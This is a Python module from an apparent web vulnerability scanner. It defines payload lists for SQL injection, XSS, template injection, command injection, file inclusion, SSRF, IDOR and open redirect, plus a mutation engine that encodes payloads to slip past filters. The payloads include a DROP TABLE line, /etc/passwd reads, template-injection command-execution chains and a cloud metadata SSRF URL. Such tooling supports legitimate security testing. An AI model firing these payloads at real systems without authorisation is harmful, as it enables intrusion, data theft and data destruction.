"""
payloads.py — Extensible payload framework.
Contains payload libraries for SQLi, XSS, SSTI, RCE, IDOR, LFI, SSRF, etc.
Supports mutation-based and generation-based payloads.
"""

from __future__ import annotations
import random
import string
import urllib.parse
from dataclasses import dataclass, field
from core.classifier import AttackVector


@dataclass
class Payload:
    """A single test payload."""
    value: str
    vector: AttackVector
    category: str              # e.g. "boolean_blind", "error_based", "reflected"
    severity: str = "medium"   # expected severity if confirmed
    description: str = ""
    encoding: str = "none"     # none, url, base64, double_url, html


# ── Payload Libraries ──────────────────────────────────────────

SQLI_PAYLOADS = [
    # Error-based
    Payload("'", AttackVector.SQLI, "error_based", "high", "Single quote error test"),
    Payload("\"", AttackVector.SQLI, "error_based", "high", "Double quote error test"),
    Payload("' OR '1'='1", AttackVector.SQLI, "boolean_blind", "critical", "Boolean OR bypass"),
    Payload("' OR '1'='1'--", AttackVector.SQLI, "boolean_blind", "critical", "Boolean OR with comment"),
    Payload("' UNION SELECT NULL--", AttackVector.SQLI, "union_based", "critical", "UNION injection probe"),
    Payload("' UNION SELECT NULL,NULL--", AttackVector.SQLI, "union_based", "critical", "UNION 2 columns"),
    Payload("' UNION SELECT NULL,NULL,NULL--", AttackVector.SQLI, "union_based", "critical", "UNION 3 columns"),
    Payload("1; DROP TABLE users--", AttackVector.SQLI, "stacked", "critical", "Stacked query test"),
    Payload("1' AND SLEEP(5)--", AttackVector.SQLI, "time_blind", "high", "Time-based blind"),
    Payload("1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--", AttackVector.SQLI, "boolean_blind", "high"),
    Payload("admin' --", AttackVector.SQLI, "auth_bypass", "critical", "Auth bypass via comment"),
    Payload("' OR 1=1 LIMIT 1--", AttackVector.SQLI, "auth_bypass", "critical"),
    Payload("1' ORDER BY 1--", AttackVector.SQLI, "order_by", "medium", "Column count probe"),
    Payload("1' ORDER BY 10--", AttackVector.SQLI, "order_by", "medium"),
    Payload("';WAITFOR DELAY '0:0:5'--", AttackVector.SQLI, "time_blind_mssql", "high", "MSSQL time-based"),
    Payload("1 AND 1=1", AttackVector.SQLI, "numeric_blind", "high", "Numeric boolean blind"),
    Payload("1 AND 1=2", AttackVector.SQLI, "numeric_blind", "high"),
]

XSS_PAYLOADS = [
    Payload("<script>alert(1)</script>", AttackVector.XSS, "reflected", "high", "Basic script injection"),
    Payload("<img src=x onerror=alert(1)>", AttackVector.XSS, "reflected", "high", "IMG tag event handler"),
    Payload("<svg/onload=alert(1)>", AttackVector.XSS, "reflected", "high", "SVG onload"),
    Payload("javascript:alert(1)", AttackVector.XSS, "href_injection", "high", "javascript: protocol"),
    Payload("'\"><script>alert(1)</script>", AttackVector.XSS, "context_break", "high", "Attribute breakout"),
    Payload("<body onload=alert(1)>", AttackVector.XSS, "reflected", "high"),
    Payload("{{7*7}}", AttackVector.XSS, "template_probe", "medium", "Template injection probe"),
    Payload("${7*7}", AttackVector.XSS, "template_probe", "medium"),
    Payload("<iframe src=javascript:alert(1)>", AttackVector.XSS, "reflected", "high"),
    Payload("' autofocus onfocus=alert(1)//", AttackVector.XSS, "event_handler", "high"),
    Payload("<details open ontoggle=alert(1)>", AttackVector.XSS, "reflected", "high"),
    Payload("'-alert(1)-'", AttackVector.XSS, "js_context", "high", "JS string context"),
    Payload("</script><script>alert(1)</script>", AttackVector.XSS, "tag_break", "high"),
]

SSTI_PAYLOADS = [
    Payload("{{7*7}}", AttackVector.SSTI, "jinja2", "critical", "Jinja2/Twig probe (expect 49)"),
    Payload("${7*7}", AttackVector.SSTI, "freemarker", "critical", "Freemarker probe"),
    Payload("#{7*7}", AttackVector.SSTI, "ruby_erb", "critical", "Ruby ERB probe"),
    Payload("<%= 7*7 %>", AttackVector.SSTI, "erb", "critical", "ERB tag probe"),
    Payload("{{config}}", AttackVector.SSTI, "jinja2_config", "critical", "Jinja2 config leak"),
    Payload("{{self.__class__.__mro__}}", AttackVector.SSTI, "jinja2_rce", "critical", "Jinja2 MRO chain"),
    Payload("${T(java.lang.Runtime).getRuntime().exec('id')}", AttackVector.SSTI, "spring_el", "critical"),
    Payload("{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}", AttackVector.SSTI, "jinja2_rce", "critical"),
]

RCE_PAYLOADS = [
    Payload("; id", AttackVector.RCE, "command_injection", "critical", "Semicolon command chain"),
    Payload("| id", AttackVector.RCE, "pipe_injection", "critical", "Pipe injection"),
    Payload("&& id", AttackVector.RCE, "and_injection", "critical", "AND command chain"),
    Payload("$(id)", AttackVector.RCE, "subshell", "critical", "Subshell injection"),
    Payload("`id`", AttackVector.RCE, "backtick", "critical", "Backtick injection"),
    Payload("; cat /etc/passwd", AttackVector.RCE, "command_injection", "critical"),
    Payload("| cat /etc/passwd", AttackVector.RCE, "pipe_injection", "critical"),
    Payload("\nid\n", AttackVector.RCE, "newline_injection", "critical", "Newline injection"),
    Payload("; ping -c 3 127.0.0.1", AttackVector.RCE, "blind_rce", "critical", "Blind RCE test"),
    Payload("|| whoami", AttackVector.RCE, "or_injection", "critical"),
]

LFI_PAYLOADS = [
    Payload("../../../etc/passwd", AttackVector.LFI, "path_traversal", "high"),
    Payload("....//....//....//etc/passwd", AttackVector.LFI, "double_dot", "high"),
    Payload("/etc/passwd", AttackVector.LFI, "absolute_path", "high"),
    Payload("php://filter/convert.base64-encode/resource=index.php", AttackVector.LFI, "php_filter", "critical"),
    Payload("file:///etc/passwd", AttackVector.LFI, "file_protocol", "critical"),
    Payload("..\\..\\..\\windows\\system.ini", AttackVector.LFI, "windows_traversal", "high"),
    Payload("/proc/self/environ", AttackVector.LFI, "proc_environ", "critical"),
]

SSRF_PAYLOADS = [
    Payload("http://127.0.0.1", AttackVector.SSRF, "localhost", "high"),
    Payload("http://localhost", AttackVector.SSRF, "localhost", "high"),
    Payload("http://0.0.0.0", AttackVector.SSRF, "zero_addr", "high"),
    Payload("http://169.254.169.254/latest/meta-data/", AttackVector.SSRF, "aws_metadata", "critical"),
    Payload("http://[::1]", AttackVector.SSRF, "ipv6_localhost", "high"),
    Payload("http://127.0.0.1:22", AttackVector.SSRF, "port_scan", "medium"),
    Payload("http://127.0.0.1:3306", AttackVector.SSRF, "port_scan", "medium"),
    Payload("gopher://127.0.0.1:25/", AttackVector.SSRF, "gopher", "critical"),
]

IDOR_PAYLOADS = [
    Payload("1", AttackVector.IDOR, "sequential", "high", "Test ID=1"),
    Payload("2", AttackVector.IDOR, "sequential", "high", "Test ID=2"),
    Payload("0", AttackVector.IDOR, "boundary", "medium", "Test ID=0"),
    Payload("-1", AttackVector.IDOR, "negative", "medium", "Test negative ID"),
    Payload("99999", AttackVector.IDOR, "high_id", "medium", "Test high ID"),
    Payload("admin", AttackVector.IDOR, "string_id", "high", "Test admin user"),
]

OPEN_REDIRECT_PAYLOADS = [
    Payload("https://evil.com", AttackVector.OPEN_REDIRECT, "direct", "medium"),
    Payload("//evil.com", AttackVector.OPEN_REDIRECT, "protocol_relative", "medium"),
    Payload("/\\evil.com", AttackVector.OPEN_REDIRECT, "backslash", "medium"),
    Payload("https://evil.com%00.target.com", AttackVector.OPEN_REDIRECT, "null_byte", "medium"),
    Payload("https://target.com@evil.com", AttackVector.OPEN_REDIRECT, "at_sign", "medium"),
]

# ── Payload registry mapping vectors to payloads ──

PAYLOAD_REGISTRY: dict[AttackVector, list[Payload]] = {
    AttackVector.SQLI: SQLI_PAYLOADS,
    AttackVector.XSS: XSS_PAYLOADS,
    AttackVector.SSTI: SSTI_PAYLOADS,
    AttackVector.RCE: RCE_PAYLOADS,
    AttackVector.LFI: LFI_PAYLOADS,
    AttackVector.SSRF: SSRF_PAYLOADS,
    AttackVector.IDOR: IDOR_PAYLOADS,
    AttackVector.OPEN_REDIRECT: OPEN_REDIRECT_PAYLOADS,
}


class PayloadEngine:
    """Manages payload selection, mutation, and generation."""

    def __init__(self):
        self._canary = self._generate_canary()

    def get_payloads(self, vector: AttackVector, max_count: int = 10) -> list[Payload]:
        """Get payloads for a given attack vector."""
        pool = PAYLOAD_REGISTRY.get(vector, [])
        if len(pool) <= max_count:
            return pool.copy()
        return random.sample(pool, max_count)

    def get_all_payloads(self, vectors: list[AttackVector], max_per_vector: int = 5) -> list[Payload]:
        """Get payloads for multiple vectors."""
        result = []
        for v in vectors:
            result.extend(self.get_payloads(v, max_per_vector))
        return result

    def mutate(self, payload: Payload) -> list[Payload]:
        """Generate mutations of a payload."""
        mutations = []
        val = payload.value

        # URL encoding
        mutations.append(Payload(
            urllib.parse.quote(val), payload.vector,
            payload.category + "_urlenc", payload.severity,
            payload.description + " (URL encoded)", "url",
        ))

        # Double URL encoding
        mutations.append(Payload(
            urllib.parse.quote(urllib.parse.quote(val)), payload.vector,
            payload.category + "_double_urlenc", payload.severity,
            payload.description + " (double URL encoded)", "double_url",
        ))

        # Case variation
        mutations.append(Payload(
            val.swapcase(), payload.vector,
            payload.category + "_case", payload.severity,
            payload.description + " (case swapped)",
        ))

        # Space bypass variations
        for spacer in ["+", "%20", "/**/", "\t"]:
            mutations.append(Payload(
                val.replace(" ", spacer), payload.vector,
                payload.category + f"_space_{spacer}", payload.severity,
            ))

        return mutations

    @property
    def canary(self) -> str:
        """Unique canary string for reflection detection."""
        return self._canary

    @staticmethod
    def _generate_canary() -> str:
        return "DM" + "".join(random.choices(string.ascii_lowercase + string.digits, k=8))
